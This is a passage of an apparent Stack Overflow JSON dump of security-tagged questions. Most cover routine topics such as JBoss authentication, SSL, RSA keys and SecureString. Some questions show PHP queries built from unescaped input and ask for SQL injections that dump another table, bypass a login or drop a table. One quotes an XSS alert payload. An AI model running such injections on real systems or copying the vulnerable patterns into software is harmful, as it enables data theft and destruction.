javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:667)\nat javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:288)\nat javax.naming.InitialContext.init(InitialContext.java:223)\nat javax.naming.InitialContext.&lt;init&gt;(InitialContext.java:197)\nat my.SampleClient.login(SampleClient.java:110)\n... 26 more\nCaused by: java.lang.RuntimeException: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed\nat org.jboss.naming.remote.protocol.IoFutureHelper.get(IoFutureHelper.java:87)\nat org.jboss.naming.remote.client.NamingStoreCache.getRemoteNamingStore(NamingStoreCache.java:56)\nat org.jboss.naming.remote.client.InitialContextFactory.getOrCreateCachedNamingStore(InitialContextFactory.java:166)\nat org.jboss.naming.remote.client.InitialContextFactory.getOrCreateNamingStore(InitialContextFactory.java:139)\nat org.jboss.naming.remote.client.InitialContextFactory.getInitialContext(InitialContextFactory.java:104)\n... 31 more\nCaused by: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed\nat org.jboss.remoting3.remote.ClientConnectionOpenListener$Capabilities.handleEvent(ClientConnectionOpenListener.java:365)\nat org.jboss.remoting3.remote.ClientConnectionOpenListener$Capabilities.handleEvent(ClientConnectionOpenListener.java:214)\nat org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:72)\nat org.xnio.channels.TranslatingSuspendableChannel.handleReadable(TranslatingSuspendableChannel.java:189)\nat org.xnio.channels.TranslatingSuspendableChannel$1.handleEvent(TranslatingSuspendableChannel.java:103)\nat org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:72)\nat org.xnio.nio.NioHandle.run(NioHandle.java:90)\nat org.xnio.nio.WorkerThread.run(WorkerThread.java:184)\nat ...asynchronous invocation...(Unknown Source)\nat org.jboss.remoting3.EndpointImpl.doConnect(EndpointImpl.java:270)\nat org.jboss.remoting3.EndpointImpl.doConnect(EndpointImpl.java:251)\nat org.jboss.remoting3.EndpointImpl.connect(EndpointImpl.java:349)\nat org.jboss.remoting3.EndpointImpl.connect(EndpointImpl.java:333)\nat org.jboss.naming.remote.client.EndpointCache$EndpointWrapper.connect(EndpointCache.java:105)\nat org.jboss.naming.remote.client.NamingStoreCache.getRemoteNamingStore(NamingStoreCache.java:55)\n... 34 more\n</code></pre>\n\n<p>Has anybody an idea what I've done wrong. Can anybody give me a hint on how to setup this scenario. I've been searching in the JBoss documentation but haven't found a solution for this problem.</p>\n\n<p>Regards,</p>\n\n<p>Thomas</p>\n"},{"tags":["security","internet-explorer"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12941366,"title":"URL with SSL port not opening in IE 8","body":"<p>Internet Explorer cannot open the SSL site URL  [https://localhost:7002/test].\nBut can open the url [http://localhost:7001/test]</p>\n\n<p>The URL stopped working all of a sudden. Is there a way to fix this issue.</p>\n"},{"tags":["php","security","sql-injection","injection","code-injection"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12936208,"title":"SQL injection that retrieves all data in a different table that the one in the query","body":"<p>I own a PHP system that works on a virtual server \"Wamp\" on windows XP. I am trying to detect the vulnerabilities in my system using SQL injection technique. </p>\n\n<p>I have tried the basic ways of injection such as \" ' OR 1=1 \" and I detected several problems. However, I am stuck on the following issue:</p>\n\n<p>I have the following line of code in my system:</p>\n\n<pre><code>$sql2=\"SELECT * FROM $table1 WHERE question_id='$id'\";\n</code></pre>\n\n<p>After this line of code, I execute the query and display the result like this:</p>\n\n<pre><code>$result2=mysql_query($sql2);\n\nwhile($rows=mysql_fetch_array($result2)){\n?&gt;\n&lt;table width=\"400\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"1\" bgcolor=\"#CCCCCC\"&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;table width=\"100%\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#FFFFFF\"&gt;\n&lt;tr&gt;\n&lt;td bgcolor=\"#F8F7F1\"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/td&gt;\n&lt;td bgcolor=\"#F8F7F1\"&gt;:&lt;/td&gt;\n&lt;td bgcolor=\"#F8F7F1\"&gt;&lt;?php echo $rows['a_id']; ?&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n.......\n.......\n</code></pre>\n\n<p>Note that the value of the variable \"$id\" is sent from the previous page as _GET[] parameter.</p>\n\n<p>My problem is, I am trying to inject the parameter id=2? (2 is an example) that is being sent from the previous page. Here's an example:</p>\n\n<pre><code>http://localhost/PHPforum/view_topic.php?id=2\n</code></pre>\n\n<p>I am looking for a way to inject the value of the variable \"$id\" in order to make it display the data of different table (table2) instead of table1. It's fine that I display both tables but I need table2 data to be displayed by that injection.</p>\n\n<p>How can I possibly do that?</p>\n\n<p>Again, I am not trying to attack any system, It's a system that I own and I am trying to detect its vulnerabilities. </p>\n"},{"tags":["php","iphone","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12933322,"title":"iPhone XML data to be encrypted","body":"<p>Our application gets all the data from PHP/Mysql server in XML format</p>\n\n<p>but now client don't want data to be appeared as it is,\nhe fears, anyone who knows those .php file links can access all data on server and will become a competitor to him.</p>\n\n<p>so i want to know is there any encryption available which i can use in php and decryption in ios.</p>\n\n<p>or SSL is the only option?</p>\n\n<p>EDIT: our php file returns XML data and client is bothered that competitors can get data,\nso i want to send encrypted data into XML and decrypt it in iPhone, so is there any good solution for that? </p>\n\n<p>Thanks</p>\n"},{"tags":["security","magento","e-commerce","brute-force","magento-1.7"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":12549585,"title":"Magento - Security and brute force","body":"<p>I'm trying to decide whether to use Magento or create my own platform and I was wondering about security. Does Magento's code include some sort of brute force protection? If not, is this not something important?</p>\n"},{"tags":["java","security","seam"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12930354,"title":"role field not stroed in database after identitymanager role creation","body":"<p>I'm using seam 2.1.2 security and i create a role using identitymanager by jsf richfaces GUI. in creation process i would add a \"description\" to role created in database , the creation of role is ok but the description field is not added, i must update the role ( in other operation by GUI)  to see the decsription field stored in databse. the question is what have i to do to store the \"description\" filed in creation operation ? thnx for your help </p>\n\n<p>bellow is my code : </p>\n\n<pre><code>  public boolean createRole(Role role) {\n    IdentityManager identityManager = IdentityManager.instance();\nlogger.info(\"creating role:\" + role.getRoleName());\nif (identityManager.roleExists(role.getRoleName())) {\n    return false;\n}\nif (identityManager.createRole(role.getRoleName())) {\n    completeRolePersistence(role);\n    return true;\n}\nreturn false;\n}\n</code></pre>\n\n<p>and the completeRolePersistence method : </p>\n\n<pre><code>public void completeRolePersistence(Role role) {\n    logger.info(\"setting additional info to role...\");\n    Query query = em.createNamedQuery(\"UPDT_ADDITIONALS\");\n    query.setParameter(\"name\", role.getRoleName())\n            .setParameter(\"description\", role.getDescription())\n            .setParameter(\"level\", role.getRoleLevel());\n    int updated = query.executeUpdate();\n    logger.info(\"roles updated with desc : \" + updated);\n}\n</code></pre>\n\n<p>it seem that the query is not executed , i print in log </p>\n\n<pre><code>roles updated with desc : 0\n</code></pre>\n\n<p>thnx for your help</p>\n"},{"tags":["security","phonegap","cordova-2.0.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12938827,"title":"See source code from PhoneGap/Cordova web view","body":"<p>I am using PhoneGap/Cordova 2.0 to build IOS and Android apps. I am little worried about code security using Cordova, as all code is in HTML, Javascript and not compiled. \nIs there a way to see the code from app UIWebView? Can someone do view source code from UIWebView. \nIf so, then how to obfuscate the code?</p>\n\n<p>Thank you</p>\n"},{"tags":["iphone","ios","security","sqlite","encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":12938517,"title":"Light protection for SQLite database on the iPhone","body":"<p>There are a bunch of questions on how to protect a SQLite database on the iPhone here. Those questions are mostly about:</p>\n\n<ul>\n<li>preventing data tampering;</li>\n<li>protecting user's personal data using a passwords that should be entered by a user.</li>\n</ul>\n\n<p>but we have a bit different situation: </p>\n\n<ul>\n<li>we have an app that is distributed with a sqlite database;</li>\n<li>the database contains publicly available information, but gathering all that information in one place requires some effort, and we don't want competitors to have a simple way to access our data;</li>\n<li>all the database content is available through the application UI, basically the purpose of the app is to nicely present that data. So it is possible to recreate the database through the UI, while there are about 50k records x 40 fields per record, which are going to be updated with each version, so manual scraping will take some time. Also it's probably possible to use some automated screen scraping to extract the data, but again it requires some effort;</li>\n<li>because of the previous point, we are not looking for some industrial grade data protection, we just want to prevent anybody from accessing the application bundle on a jailbroken device and copying the database out of it.</li>\n</ul>\n\n<p>I think that we need some kind of fancy obfuscation of the column contents. Probably we should encrypt the columns using some key that is unique to the app, and can't be accessed by anybody else (if such key exist in the AppStore).</p>\n\n<p>Any suggestions and best practices are appreciated,</p>\n\n<p>Thank you</p>\n"},{"tags":["php","security","passwords","hash","password-protection"],"answer_count":1,"favorite_count":6,"up_vote_count":4,"down_vote_count":0,"view_count":1443,"score":4,"question_id":3290283,"title":"What is a good way to produce a random \"site salt\" to be used in creating password retrieval tokens?","body":"<p>I would like to create a site-wide hash to be used as salt in creating password retrieval tokens. I have been bouncing around stackoverflow trying to get a sense of the best way to do this. </p>\n\n<p>Here's the reset process:</p>\n\n<p>When a user requests a password reset email the code generates a retrieval token:</p>\n\n<pre><code>$token = hash_hmac('sha256', $reset_hash* , $site_hash)\n</code></pre>\n\n<p>*$reset_hash is a hash created using phpass HashPassword() function, saved in the user table.</p>\n\n<p>I then send the token in a URL to the users email address. They click before the token times out in an hour. I match their submission with the a challenge token generated server-side. If it matches, then they are forced to choose a new password, and then login.</p>\n\n<p>I would like to know the best way to generate the $site_key. I am thinking of using another HMAC hash that is seeded by random numbers:</p>\n\n<pre><code>$site_key = hash_hmac('sha256', MCRYPT_DEV_RANDOM, MCRYPT_DEV_RANDOM);\n</code></pre>\n\n<p>This produces something like this:</p>\n\n<pre><code>98bb403abbe62f5552f03494126a732c3be69b41401673b08cbfefa46d9e8999\n</code></pre>\n\n<p>Will this be a suitably random to be used for this purpose? Am I overcomplicating this, or approaching it the wrong way?</p>\n\n<p><a href=\"http://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords/401684#401684\">I was inspired to use HMAC by this answer</a></p>\n\n<p><strong>EDIT:</strong> I am trying to avoid a 'secret question' step urged by some of my coworkers, so I would like the reset link to provide a single step to resetting the password. Therefore, my concern is that this process be secure enough to safeguard a system containing sensitive information.</p>\n\n<p><strong>RESOLVED, for now:</strong> I am going to go with a nonce as described by The Rook as the reset token. Thanks everyone for the comments and feedback.</p>\n"},{"tags":["c#",".net","visual-studio-2010","security"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":208,"score":4,"question_id":12783270,"title":"How to make sure if global keyboard hook have been disconnected?","body":"<p>I have used <a href=\"http://blogs.msdn.com/b/toub/archive/2006/05/03/589423.aspx\" rel=\"nofollow\">Stephen Toubs </a> version of global keyboard hook, using it in a WIN 7 environment.</p>\n\n<p>It works fine for a moment, and then it just stops receiving keystrokes.</p>\n\n<p>I have increased the timeout value in regedit but it still disconnects after some time.</p>\n\n<p>So problem is, how do I detect if it have been disconnected and how do I set the hook to be active again?</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":70,"score":0,"question_id":12921305,"title":"https inside a page","body":"<p>Hi i have a html page and i want that only login section of page get secure.\nCan i do it ?</p>\n\n<p>Also if https is secure than why not all pages are https ?</p>\n"},{"tags":["java","security","ssh","sftp","theoretical-problem"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12935490,"title":"How to prevent an infinite download?","body":"<p>(By now, this problem is purely theoretical, since we have found a way to avoid it. However, I couldn't solve it at the time it presented itself.)</p>\n\n<p>Using Java, I want to discover and download a file from a single fixed server via SSH FTP at fixed intervals.<br>\nThe remote server, the protocol, the timing and the file are outside my control.\nThe remote server is controlled by a trusted source.</p>\n\n<p>I am currently using Java implementations of <code>ls</code> and <code>get</code> to do download the files.</p>\n\n<p>My client is quite security-conscious, so he wants to prevent as many technical angles of attack as possible.</p>\n\n<p>While thinking about the possibility of a malign entity either impersonating or taking control of the remote server, I noticed that they might replace the usual server with an implementation that replies to <code>ls</code> with an infinite list of files, or replies to <code>get</code> with an infinite stream of bytes.\nAt some point, my memory or harddrive would break and my program crash.</p>\n\n<p>Assuming that I don't know the size a file could take, are there ways to detect and prevent such an attack without stopping legal (but large) downloads?<br>\nI was thinking about checking the number of files/file size beforehand, but even then an attacker could trigger his attack only after I had made such checks.</p>\n"},{"tags":["c#","security","windows-services","localsystem"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12934999,"title":"Execute task as system?","body":"<p>I'm  trying to test some code that will be running as a service on a remote machine (the service will be running as Local System).</p>\n\n<p>I'm trying to figure out the easiest way on my system to test the code out while it is running underneath the System context.</p>\n\n<p>What would be the easiest way to get the code running underneath the local system account?</p>\n"},{"tags":["ios","security","cryptography","rsa","public-key-encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12934743,"title":"iOS SecItemCopyMatching RSA public key format?","body":"<p>I'm trying to extract a 1024-bit RSA public key from an already generated key pair (two <code>SecKeyRef</code>s), in order to send it over the wire. All I need is a plain <code>(modulus, exponent)</code> pair, which should take up exactly 131 bytes (128 for the modulus and 3 for the exponent).</p>\n\n<p>However, when I fetch the key info as a <code>NSData</code> object, I get 140 bits instead of 131. Here's an example result:</p>\n\n<pre><code>&lt;30818902 818100d7 514f320d eacf48e1 eb64d8f9 4d212f77 10dd3b48 ba38c5a6\n ed6ba693 35bb97f5 a53163eb b403727b 91c34fc8 cba51239 3ab04f97 dab37736\n 0377cdc3 417f68eb 9e351239 47c1f98f f4274e05 0d5ce1e9 e2071d1b 69a7cac4\n 4e258765 6c249077 dba22ae6 fc55f0cf 834f260a 14ac2e9f 070d17aa 1edd8db1\n 0cd7fd4c c2f0d302 03010001&gt;\n</code></pre>\n\n<p>After retrying the key generation a couple of times and comparing the resulting <code>NSData</code> objects, the bytes that remain the same for all keys are the first 7:</p>\n\n<pre><code>&lt;30818902 818100&gt;\n</code></pre>\n\n<p>The last three bytes look like the exponent (65537, a common value). There are also two bytes between the \"modulus\" and the exponent:</p>\n\n<pre><code>&lt;0203&gt;\n</code></pre>\n\n<p>Can someone with more crypto experience help me identify what encoding is this? DER? How do I properly decode the modulus and exponent?</p>\n\n<p>I tried manually stripping out the modulus and exponent using</p>\n\n<pre><code>NSData* modulus = [keyBits subdataWithRange:(NSRange){ 7, 128 }];\nNSData* exponent = [keyBits subdataWithRange:(NSRange){ 7 + 128 + 2, 3 }];\n</code></pre>\n\n<p>but I get errors when trying to decrypt data which the remote host encoded using that \"key\".</p>\n"},{"tags":["python","security","file-io"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":85,"score":0,"question_id":12932340,"title":"Read only a part of the file that was written using certain function","body":"<p>I have a text file for which I use two write functions: 1) Normal Write, 2) Secure Write.\nBoth the write functions take the data and offset in the file to start writing as parameters.</p>\n\n<p>Now when I want to read the data from the file, I should be only be able to read the data written using the \"Normal Write\" function and should not be able to read the data written using \"Secure Write\" function.</p>\n\n<p>When the user attempts to read the data written using the secure write function, then an exception should be raised. Also if some secure data is sandwiched between non-secure data then only the non-secure contents should be displayed.</p>\n\n<p>Eg: If file contains \"helloHOWareyou\", with'hello' and 'areyou' written using normal write and 'HOW' is written using secure write,then only 'hello' and 'are you' should be read.</p>\n\n<p>I tried this holding the offsets and the length of the secure data in a file header and comparing this with the offset passed to the read function.</p>\n\n<pre><code>#Normal Write \ndef writeat(self,data,offset): \n    self.file.writeat(data,offset)\n\n#Secure Write \ndef securewrite(self,data,offset):\n    #Global dict to store the offset and length of secure data\n    #Have to use this since it is a spec\n    myvar['offset']=(offset,offset+len(data)) \n    self.file.writeat(data,offset)\n\n#Read function\ndef readata(self,bytes,offset):\nsecureRange=mycontext['offset']\nif offset in range(secureRange[0],secureRange[1]):\n       raise ValueError\nelse:\n       return self.file.readat(bytes,offset)\n</code></pre>\n\n<p>Test Program:</p>\n\n<pre><code>myfile=openfile(\"sample.txt\",a)  #Open a file\n\n#Write some data to file\nmyfile.writeat(\"abcd\",0)\n\n#Write private data to file\nmyfile.securewrite(\"efgh\",4)\n\n# This read is in the region written by writeat and should not be blocked...\nx=myfile.readat(4,0)\nprint x\n\ntry:\n  #Try to read the secure data from the file\n  y=myfile.readat(4,4)\n  print y\n\nexcept ValueError:\n    print (\"Value Error Handled\")\n    pass\n\nelse:\n  print (\"Secure data compromised!\")    \n\nfinally:\n  #Close the file\n  myfile.close()`\n</code></pre>\n\n<p>Had some success with it but of little help.</p>\n"},{"tags":["php","regex","security"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12932426,"title":"Is it a good idea to let users query by regex?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2371445/sanitization-of-user-supplied-regular-expressions-in-php\">Sanitization of User-Supplied Regular Expressions in PHP</a>  </p>\n</blockquote>\n\n\n\n<p>Let's say you want to let users search for something and your search function has the ability to accept regular expressions.</p>\n\n<p>Is it OK to let site users to search by regexes that they post? From a user's point of view, I'd love a site which would let me do that :D</p>\n\n<p>Is there any security risk involved? How can I sanitize a regex?</p>\n"},{"tags":["android","security","android-webview"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12932735,"title":"How can I prevent an Android WebView from manipulating a web page?","body":"<p>As shown <a href=\"http://stackoverflow.com/questions/2219074/in-android-webview-am-i-able-to-modify-a-webpages-dom\">here</a> it is possible to:\n1. Create an Android WebView with setJavaScriptEnabled=true\n2. Load a URL\n3. Override onPageFinished and change the Web page displayed to the user</p>\n\n<p>Now, is it possible for the Web page owner to implement anything server-side which prevents this from happening? The risk is that a malicious app could spoof the user by amending the Web page for nefarious means...</p>\n\n<p>Many thanks!</p>\n"},{"tags":["java","security","email"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":44,"score":-2,"question_id":12928879,"title":"How to send an email with password details in JSF","body":"<p>Suppose a user forgot his password and he wants to know his password. He has to provide an answer for his security question. After providing the correct answer, I want to send an email with password details to the user's email address.</p>\n\n<p>So, what mail configurations should I do in jsf so that it interacts with many email addresses of respective users?</p>\n"},{"tags":["java","spring","security","jmx"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12929335,"title":"Java JMX get the logged in user","body":"<p>I have a JMX server started by JVM process that can be optionally secured (for now its not, so I'm ready to consider any extensible way for it). For example as an option I looked at <a href=\"http://docs.oracle.com/javase/6/docs/technotes/guides/management/agent.html\" rel=\"nofollow\">official tutorial</a> and its ok for now to use user/password authentication.\nThe MBeans are deployed via spring (annotations approach is used).</p>\n\n<p>Now I would like to get <strong>from within</strong> my MBean the user name for some additional actions. Is it possible to do in JMX technology at all? If Yes how? :)</p>\n\n<p>Example:</p>\n\n<pre><code>public class MyMBean {\n\n    public void myOp() {\n\n        String userName = ... ?;  // or whatever object that can bring me the name\n\n        makeSomethingWithUserName ( userName );\n\n        doMyStuffHere();\n    }\n}\n</code></pre>\n\n<p>I've found <a href=\"http://www.java.net/node/680707\" rel=\"nofollow\">this tutorial</a> but it seems to be glassfish specific and I'm looking for plain java based solution.</p>\n\n<p>Thanks a lot and have a nice day</p>\n"},{"tags":["c#",".net","security","encryption"],"answer_count":2,"favorite_count":1,"up_vote_count":17,"down_vote_count":0,"view_count":6493,"score":17,"question_id":818704,"title":"How to convert SecureString to System.String?","body":"<p>All reservations about unsecuring your SecureString by creating a System.String out of it <strong>aside</strong>, how can it be done?</p>\n\n<p>How can I convert an ordinary System.Security.SecureString to System.String?</p>\n\n<p>I'm sure many of you who are familiar with SecureString are going to respond that one should never transform a SecureString to an ordinary .NET string because it removes all security protections.  <strong>I know</strong>.  But right now my program does everything with ordinary strings anyway, and I'm trying to enhance its security and although I'm going to be using an API that returns a SecureString to me I am <em>not</em> trying to use that to increase my security.  </p>\n\n<p>I'm aware of Marshal.SecureStringToBSTR, but I don't know how to take that BSTR and make a System.String out of it.</p>\n\n<p>For those who may demand to know why I would ever want to do this, well, I'm taking a password from a user and submitting it as an html form POST to log the user into a web site.  So... this really has to be done with managed, unencrypted buffers.  If I could even get access to the unmanaged, unencrypted buffer I imagine I could do byte-by-byte stream writing on the network stream and hope that that keeps the password secure the whole way.  I'm hoping for an answer to at least one of these scenarios.</p>\n\n<p>Thanks!</p>\n"},{"tags":["xml","security","authentication","protect"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12926176,"title":"How can I secure or authenticate access to XML files?","body":"<p>I have a XML file that saves EMail template information, and one thing contained therein is user emails. Is there a way to ensure that only logged in users can access this file? For instance, I would like to do something like this for a PHP page:</p>\n\n<pre><code>require(\"checklogin.php\")\n</code></pre>\n"},{"tags":["mysql","security","injection"],"answer_count":6,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":2270,"score":5,"question_id":1508431,"title":"How to demonstrate SQL Injection in this PHP and MySQL code?","body":"<p>I'd like to note first that this is an education attempt on my own database to better understand MySQL injections to protect my own code.</p>\n\n<p>I need to work out a couple of examples of how a MySQL injection can be constructed against the following code. It's a basic user login system where I'm accepting the username and password without any escaping </p>\n\n<pre><code>$user = (!empty($_POST['user'])) ? $_POST['user'] : '';\n$pass = (!empty($_POST['pass'])) ? $_POST['pass'] : '';\n</code></pre>\n\n<p>The MySQL query then tries to find the entered username and password in my table called users, as follows: </p>\n\n<pre><code>$res = mysql_query(\"SELECT * from users where user='{$user}' AND pass='{$pass}'\");\n</code></pre>\n\n<p>This is un-escaped input, and I'm trying to come up with MySQL injections to:</p>\n\n<ol>\n<li>bypass the password knowing a legitimate user's username (one user in my users table is tester), and</li>\n<li>an injection that would drop the <a href=\"http://xkcd.com/327\" rel=\"nofollow\">users</a> table in its entirety. </li>\n</ol>\n\n<p>I've tried a couple of MySQL injection examples from <a href=\"http://en.wikipedia.org/wiki/SQL_injection\" rel=\"nofollow\">Wikipedia</a>, but I'm guessing the <code>{}</code> in my query is preventing the injection, so I would appreciate some help from those who are confident with this, and thank you to all.</p>\n"},{"tags":["javascript","android","security","sharedpreferences"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12927570,"title":"Can I read sharedpreference from Javascript in android?","body":"<p>In my Android application, if I download some <code>JavaScript</code> from a web URI, can that JavaScript read my native files like shared preferences or other files which I stored in my application's location?</p>\n\n<p>Any ideas?</p>\n"},{"tags":["security","web-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12927733,"title":"Is verisign VIP(Validation & ID Protection) Access Desktop safe enough?","body":"<p>I saw this software on verisign homepage:\n<a href=\"https://idprotect.verisign.com/desktop/home.v\" rel=\"nofollow\">https://idprotect.verisign.com/desktop/home.v</a></p>\n\n<p>Unlike many hardware one time password products,\nit creates the one time password on PC,\nthat password might leak on virus attacks.</p>\n\n<p>BTW, verisign sells hardware one time password product too:\n<a href=\"https://idprotect.verisign.com/tokencatalogkeychain.v\" rel=\"nofollow\">https://idprotect.verisign.com/tokencatalogkeychain.v</a>),</p>\n"},{"tags":["javascript","html","security","xss"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12926997,"title":"How to temporarily disable XSS protection in modern browsers for testing?","body":"<p>Is it possible to temporarily disable the XSS protection found in modern browsers for testing purposes?</p>\n\n<p>I'm trying to explain to a co-worker what happens when one sends this to an XSS-vulnerable web form:</p>\n\n<pre><code>&lt;script&gt;alert(\"Danger\");&lt;/script&gt;\n</code></pre>\n\n<p>However, it appears that both Chrome and Firefox are preventing the XSS popup. Can I disable this protection so I can fully see the results of my actions?</p>\n"},{"tags":["security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":50,"score":-5,"question_id":12927127,"title":"Does this replaceAll \"sanitize\" a path?","body":"<p>Written in Java.\nI dont understand why this would be a security issue\nif fName = ..project/blah/blah.exe</p>\n\n<p>would this possibly open a file that might be malicious on a different directory that has the same name?</p>\n\n<pre><code>String sFileName = request.getParameter(fName);\nsFileName = sFileName.replaceAll(\"/\", \\\\\");\nsFileName = sFileName.replaceAll(..\\\\\", \"\"); \n</code></pre>\n"},{"tags":["flash","security","flash-cs4","sandbox","violation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3109,"score":0,"question_id":2544568,"title":"Flash CS4 AS3 Security Sandbox Violation","body":"<p>I have build my entire website with flash and embedded several swf objects (slideshows) into it. everything always worked fine when I published it as swf movie.\nbut now that I want to upload my website an error message occurs saying:</p>\n\n<pre><code>Error #2044: Unhandled SecurityErrorEvent:. text=Error #2140: Security sandbox violation: file:///mylayout.swf cannot load file:///slideshow_1.swf. Local-with-filesystem and local-with-networking SWF files cannot load each other.\n</code></pre>\n\n<p>I know that it has something to do with the fact that one of the swf is local with filesystem and the other local with networking. but in my publish settings i told it to access local files only. but it didnt help.</p>\n\n<p>does anyone have an answer?</p>\n\n<hr>\n\n<p>sorry for being such a newbie in doing a flash website. \nbut i dont really know what your are talking about. \ni am hosting my website at www.all-inkl.com. \nbesides that i have not uploaded it yet. i am just testing it offline. \nand the code </p>\n\n<pre><code>&lt;allow-access-from domain=\"localhost\" secure=\"true\"/&gt;`\n</code></pre>\n\n<p>where should i add it, to my timeline?</p>\n\n<p>thank you for your help.</p>\n"},{"tags":["php","security","directory-traversal"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1544,"score":1,"question_id":4205141,"title":"Preventing Directory Traversal in PHP but allowing paths","body":"<p>I have a base path /whatever/foo/</p>\n\n<p>and\n$_GET['path'] should be relative to it.</p>\n\n<p>However how do I accomplish this (reading the directory), without allowing directory traversal?</p>\n\n<p>eg.</p>\n\n<p>/..|../</p>\n\n<p>Will not filter properly.</p>\n"},{"tags":["python","security","webserver","messaging","rabbitmq"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":120,"score":1,"question_id":11954580,"title":"RabbitMQ - Game Rooms and Security Considerations","body":"<p>I'm programming an Android application and want to define rooms. The rooms would hold all the users of certain game. This is like poker with 4 players, where each room can hold 4 users. I also want to use rabbitmq for scalability and customobility. The problem is that the Android application uses the same username:password to connect all users to a RabbitMQ server (specific virtual host). </p>\n\n<p>I guess I'm worried that one user might be able to read/write messages from different queues that it should. There are multiple solutions that are not satisfactory:</p>\n\n<ol>\n<li><p>Use a different user in each Android application: This really can't be done, because the Android Market doesn't allow different applications for each user that downloads it. Even if it did, it's a stupid idea anyway.</p></li>\n<li><p>Set appropriate access controls: <a href=\"http://www.rabbitmq.com/access-control.html\" rel=\"nofollow\">http://www.rabbitmq.com/access-control.html</a> . I guess  this wouldn't prevent the problem of a malicious attacker reading/writing messages from/to queues it doesn't have access to.</p></li>\n<li><p>Set appropriate routing keys: I guess if each user creates another queue from which it can read messages and published messages to specifically defined queue, this can work. But I guess the problem is the same, since users will be connecting to the RabbitMQ with the same username:password: therefore this user can read all queues and write to them (based on the access rules).</p></li>\n</ol>\n\n<p>My question is: how to allow an attacker from reading/writing to queues that represent only the rooms he's currently joined in, and preventing access to other queues?</p>\n"},{"tags":["osx","security","service","restart"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12925259,"title":"restarting Mac OS securityd","body":"<p>Currently, MacOS has a bug where upon unlocking a Smartcard in Keychain.app will result in the padlock icon within system preferences to become frozen.  You can no longer \"click to unlock\" the padlock to elevate to admin privileges within system preferences.  </p>\n\n<p>Internally, we have found that restarting <code>securityd</code> solves the \"frozen\" padlock, but with this restart comes lots of problems for the OS X.</p>\n\n<p>Here is what we are talking about becoming frozen (see red circle):</p>\n\n<p><img src=\"http://i.stack.imgur.com/o8r8n.jpg\" alt=\"padlock icon\"></p>\n\n<p>Here is how we stopped and started securityd.</p>\n\n<pre><code>sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.securityd.plist\nsudo launchctl load -w /System/Library/LaunchDaemons/com.apple.securityd.plist\n</code></pre>\n\n<p>When this was completed, the padlock become functional again.  However, we found the following problems after restart:</p>\n\n<ol>\n<li>The user can no longer wake from screensaver - the username/password\ndialogue will not appear for any wake event, keyboard or mouse move,\nresulting in a machine that will require a restart or force to login\nwindow</li>\n<li>You cannot unmount any shares or CD's/DVD's - any mounted shares\nwill no longer unmount    as a result of this securityd restart</li>\n<li>Some other minor issues were reported (which I did not experience),\nyou can read them here in this Apple Community Thread:</li>\n</ol>\n\n<blockquote>\n  <p><a href=\"https://discussions.apple.com/thread/3248969?start=60&amp;tstart=5\" rel=\"nofollow\">https://discussions.apple.com/thread/3248969?start=60&amp;tstart=5</a></p>\n</blockquote>\n\n<p>It seems entirely possible that Apple would not like the restarting of securityd to take place, however, we have found that this is the only solution that works for resetting the padlock to a functional state.  We have tried restarting <code>pcdcd</code> and that did not help and other 